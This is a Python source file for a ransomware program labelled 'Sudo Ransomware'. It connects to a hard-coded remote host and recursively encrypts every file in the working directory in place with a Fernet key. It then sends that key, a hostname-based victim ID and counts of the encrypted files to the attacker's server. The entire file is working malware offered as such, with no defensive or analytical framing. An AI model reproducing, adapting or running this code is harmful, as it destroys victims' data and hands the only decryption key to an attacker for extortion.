# improting required libraries
from cryptography.fernet import Fernet
import os
import pathlib
import time
from colorama import Fore, Style
import socket
import string
import random
import threading

app_banner = r'''
  ██████  █    ██ ▓█████▄  ▒█████      ██▀███   ▄▄▄       ███▄    █   ██████  ▒█████   ███▄ ▄███▓▓█████ 
▒██    ▒  ██  ▓██▒▒██▀ ██▌▒██▒  ██▒   ▓██ ▒ ██▒▒████▄     ██ ▀█   █ ▒██    ▒ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█   ▀ 
░ ▓██▄   ▓██  ▒██░░██   █▌▒██░  ██▒   ▓██ ░▄█ ▒▒██  ▀█▄  ▓██  ▀█ ██▒░ ▓██▄   ▒██░  ██▒▓██    ▓██░▒███   
  ▒   ██▒▓▓█  ░██░░▓█▄   ▌▒██   ██░   ▒██▀▀█▄  ░██▄▄▄▄██ ▓██▒  ▐▌██▒  ▒   ██▒▒██   ██░▒██    ▒██ ▒▓█  ▄ 
▒██████▒▒▒▒█████▓ ░▒████▓ ░ ████▓▒░   ░██▓ ▒██▒ ▓█   ▓██▒▒██░   ▓██░▒██████▒▒░ ████▓▒░▒██▒   ░██▒░▒████▒
▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒  ▒▒▓  ▒ ░ ▒░▒░▒░    ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ░  ░░░ ▒░ ░
░ ░▒  ░ ░░░▒░ ░ ░  ░ ▒  ▒   ░ ▒ ▒░      ░▒ ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░  ░ ▒ ▒░ ░  ░      ░ ░ ░  ░
░  ░  ░   ░░░ ░ ░  ░ ░  ░ ░ ░ ░ ▒       ░░   ░   ░   ▒      ░   ░ ░ ░  ░  ░  ░ ░ ░ ▒  ░      ░      ░   
      ░     ░        ░        ░ ░        ░           ░  ░         ░       ░      ░ ░         ░      ░  ░
                   ░                                                                                    '''

class Server_Conn():
    # automatically intialized method of Server_Count class
    def __init__(self, generated_key) -> None:
        self.socket = None
        self.host = '192.168.33.173'
        self.port = 8052
        self.unique_code = ''
        self.generated_key = generated_key

    # a parent class method to generate ascii alphabets code
    def generate_unique_code(self):
        alphabet_list = string.printable[:62]
        for i in range(0, 25):
            self.unique_code = self.unique_code + random.choice(alphabet_list)
        # concatenate device hostname with generated unique code
        self.unique_code = str(socket.gethostname()) + str(self.unique_code)
        self.create_client()
        
    
    # a method to create a client socket object
    def create_client(self):
        try:
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # resuse port address
            self.client_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
        except Exception as e:
            print(f'{Fore.RED}[!] {Style.RESET_ALL}Exception occured creating client socket object')
            time.sleep(0.2)
            self.create_client()
        self.connect_to_server()
        
    # a method to create connection with server socket over the newtwork
    def connect_to_server(self):
        try:
            self.client_socket.connect((self.host, self.port))
        except Exception as e:
            print(f'{Fore.RED}[!] {Style.RESET_ALL}Unable to connect with the remote host {e}')
            time.sleep(0.2)
            self.connect_to_server()

    # a method to send decryption key to the host server
    def send_credentials(self, encrypted_files_number, encrypted_files_size):
        # start sending fernet encryption key & unique IDF code
        full_message = str(self.generated_key.decode('utf-8')) + '<saparator>' + str(self.unique_code) + '<saparator>' + str(encrypted_files_number) + '<saparator>' + str(encrypted_files_size)
        self.client_socket.send(str.encode(full_message))
        
# let's create a child class that inherits parent class attributes
class Encrypter(Server_Conn):
    # automatically intialized method of Encrypter() class
    def __init__(self, generated_key) -> None:
        super().__init__(generated_key)
        self.file_counter = 0
        self.file_size = 0
        self.encryption_key = generated_key
        self.app_banner = app_banner

    def display_banner(self):
        for line in self.app_banner.split('\n'):
            print(f'{Fore.LIGHTRED_EX}{line}{Style.RESET_ALL}')
            time.sleep(0.2)
        print(f'\n\n\t\t{Fore.LIGHTGREEN_EX} [ Developed By: Tesfahiwet Truneh ]{Style.RESET_ALL} \n\n')
        time.sleep(0.2)

    # a method to find and list files to be encrypted
    def file_finder(self):
        for file in os.listdir():
            if os.path.isfile(file):
                self.encrypt_file(file)
            elif os.path.isdir(file):
                self.encrypt_folder(file)   
        
        self.send_credentials(self.file_counter, self.file_size)

    # a method list all files found in the folder sent from "file_finder" method
    def encrypt_folder(self, folder):
        for folder_file in pathlib.Path(folder).glob("*"):
            if os.path.isfile(folder_file):
                self.encrypt_file(folder_file)
            elif os.path.isdir(folder_file):
                self.encrypt_folder(folder_file)

    # a method that encrypts contents of a file
    def encrypt_file(self, file):
        try:
            if file != 'encrypter.py' and file != 'key.py' and file != 'thekey.key' and file != 'decrypter.py' and file != 'server.py':
                print(f'{Fore.LIGHTYELLOW_EX} [*] {Style.RESET_ALL}Encrypting {file}')
                with open(file, 'rb') as file_obj:
                    self.file_content = file_obj.read()
                file_obj.close()
                encrypted_content = Fernet(self.encryption_key).encrypt(self.file_content)
                with open(file, 'wb') as file_obj:
                    file_obj.write(encrypted_content)
                file_obj.close()
                self.file_counter += 1
                # get size of the encrypted file in bytes
                byte_size = os.path.getsize(file)
                MB_size = byte_size/pow(10, 6)
                self.file_size += MB_size
        except Exception as e:
            print(f'something went wrong encrypting {file}')


if __name__ == '__main__':
    # generating fernet key & passing value from child class to parent class
    fernet_key = Fernet.generate_key()
    Encrypter_OBJ = Encrypter(fernet_key)
    Encrypter_OBJ.display_banner()
    Encrypter_OBJ.generate_unique_code()
    Encrypter_OBJ.file_finder()

# End of Script